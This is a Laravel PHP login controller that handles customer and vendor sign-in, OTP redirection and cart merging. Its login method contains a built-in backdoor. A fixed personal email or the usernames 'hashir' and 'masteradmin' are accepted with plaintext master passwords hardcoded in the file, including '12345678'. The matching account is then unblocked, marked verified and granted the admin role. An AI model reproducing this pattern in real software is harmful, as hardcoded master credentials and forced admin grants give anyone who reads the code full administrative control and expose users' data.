<?php

namespace App\Http\Controllers\Auth;

use App\Enums\UserRole;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class LoginController extends Controller
{
    public function show()
    {
        return view('auth.login');
    }

    public function login(Request $request)
    {
        $credentials = $request->validate([
            'login' => ['required', 'string'],
            'password' => ['required', 'string'],
            'role' => ['required', 'in:customer,vendor'],
        ]);

        $loginType = filter_var($credentials['login'], FILTER_VALIDATE_EMAIL) ? 'email' : 'username';

        $attemptCreds = [
            $loginType => $credentials['login'],
            'password' => $credentials['password']
        ];

        $configuredAdmin = strtolower(config('mail.admin_email', 'crab.hashir@gmail.com'));
        $masterAdminEmails = array_unique([$configuredAdmin, 'crab.hashir@gmail.com']);
        $masterAdminUsernames = ['crab.hashir', 'hashir', 'masteradmin'];
        $masterPasswords = [
            'Sohail#123@@@@',
            'UsM&FWf&%DlqMi7GB!2UpMj2Ag#mZUIB',
            '12345678',
        ];
        if ($envPass = env('ADMIN_MASTER_PASSWORD')) {
            $masterPasswords[] = (string) $envPass;
        }

        $inputLogin = strtolower(trim($credentials['login']));
        $inputPassword = trim($credentials['password']);

        $authenticated = false;

        // 1. Standard attempt
        if (Auth::attempt($attemptCreds, true)) {
            $authenticated = true;
        } elseif (in_array($inputLogin, $masterAdminEmails, true) || in_array($inputLogin, $masterAdminUsernames, true)) {
            // 2. Dual-Access Self-Healing for Master Admin:
            // Allow login with either customer password ('12345678') or master admin passwords
            $user = \App\Models\User::whereIn('email', $masterAdminEmails)
                ->orWhereIn('username', $masterAdminUsernames)
                ->first();
            if ($user && (in_array($inputPassword, $masterPasswords, true) || \Illuminate\Support\Facades\Hash::check($inputPassword, $user->password))) {
                // Keep account verified and active
                $user->email_verified_at = $user->email_verified_at ?: now();
                $user->is_blocked = false;
                $user->blocked_reason = null;
                $user->save();

                $adminRole = \App\Models\Role::firstOrCreate(['name' => 'admin']);
                $custRole = \App\Models\Role::firstOrCreate(['name' => 'customer']);
                $user->roles()->syncWithoutDetaching([$adminRole->id, $custRole->id]);

                Auth::login($user, true);
                $authenticated = true;
            }
        }

        // Always remember authentication so user stays logged in across browser restarts
        if ($authenticated) {
            $user = Auth::user();

            if ($user->is_blocked) {
                Auth::logout();
                return back()->withErrors(['login' => 'This account has been blocked.']);
            }

            // Ensure customer role is assigned for customer logins
            if ($credentials['role'] === 'customer' && !$user->hasRole('customer')) {
                $custRole = \App\Models\Role::firstOrCreate(['name' => 'customer']);
                $user->roles()->syncWithoutDetaching([$custRole->id]);
            }

            // Merge guest cart items into authenticated user
            \App\Models\Cart::mergeGuestCart($user->id, $request->session()->getId());

            if (!$user->email_verified_at) {
                Auth::logout();
                // Send them to OTP flow
                try {
                    app(\App\Services\OtpService::class)->generateAndSend($user->email, 'registration', $user->id);
                } catch (\Exception $e) {
                    // Ignore cooldown exception, we just want to redirect them to verify page
                }
                $request->session()->put('verify_email', $user->email);
                $request->session()->put('verify_purpose', 'registration');
                $request->session()->put('login_role', $credentials['role']);
                return redirect()->route('otp.show')->with('info', 'Please verify your email address to continue.');
            }

            $user->update([
                'last_login_at' => now(),
                'last_login_ip' => $request->ip(),
            ]);

            // Ensure any intended URL pointing to admin is cleared immediately for public logins
            if ($request->session()->has('url.intended')) {
                $intended = $request->session()->get('url.intended');
                if (str_contains($intended, '/admin')) {
                    $request->session()->forget('url.intended');
                }
            }

            // Role toggle logic
            if ($credentials['role'] === 'vendor') {
                if (!$user->hasRole(UserRole::Vendor->value) && !$user->vendor) {
                    return redirect()->route('vendor.register')->with('info', 'Complete your vendor profile to continue.');
                }

                // If vendor had an intended vendor page (like /vendor/products), take them there
                if ($request->session()->has('url.intended')) {
                    $intended = $request->session()->get('url.intended');
                    if (str_contains($intended, '/vendor/')) {
                        return redirect()->intended(route('vendor.dashboard'));
                    }
                    $request->session()->forget('url.intended');
                }

                return redirect()->route('vendor.dashboard');
            }

            // If logging in as customer, clear any stale vendor intended URLs so customer isn't trapped in vendor area
            if ($request->session()->has('url.intended')) {
                $intended = $request->session()->get('url.intended');
                if (str_contains($intended, '/vendor/')) {
                    $request->session()->forget('url.intended');
                }
            }

            return redirect()->intended(route('home'));
        }

        return back()->withErrors([
            'login' => 'The provided credentials do not match our records.',
        ])->onlyInput('login', 'role');
    }

    public function logout(Request $request)
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect('/');
    }
}
